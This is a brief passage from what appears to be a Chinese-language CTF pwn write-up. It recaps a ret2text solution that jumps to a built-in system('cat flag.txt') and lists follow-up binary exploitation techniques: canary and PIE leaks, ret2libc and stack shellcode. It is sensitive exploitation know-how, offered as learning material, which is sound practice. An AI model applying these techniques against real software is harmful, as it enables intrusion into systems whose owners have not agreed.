- **ret2text**：程序里有现成的 `system("cat flag.txt")`，直接跳过去，不需要构造 ROP 链。

上一题 rip 用的是 `fun + 1` 跳过 `push rbp`，这题把两种对齐方法放在一起对比，应该能记得更牢。下一题可以往这几个方向走：

| 方向 | 要解决的问题 |
| --- | --- |
| 32 位 ret2text | 地址 4 字节，用 `p32`；参数从栈上传 |
| 有 canary | 先泄露 canary，再覆盖返回地址 |
| 有 PIE | 先泄露程序基址，再算真实地址（这题的 `WOW:` 泄露就是现成例子） |
| 没有后门 | ret2libc：泄露 libc 地址，找 `system` 和 `/bin/sh` |
| NX 关闭 | 往栈上写 shellcode 再跳过去 |

{% note success %}
**一条经验**：pwn 题先别急着写 exp。`file`、`checksec`、IDA、gdb 四步走完，搞清楚“漏洞在哪、能控制什么、能跳去哪”，偏移和对齐都是后面自然算出来的。工具只是手，思路才是关键。
{% endnote %}
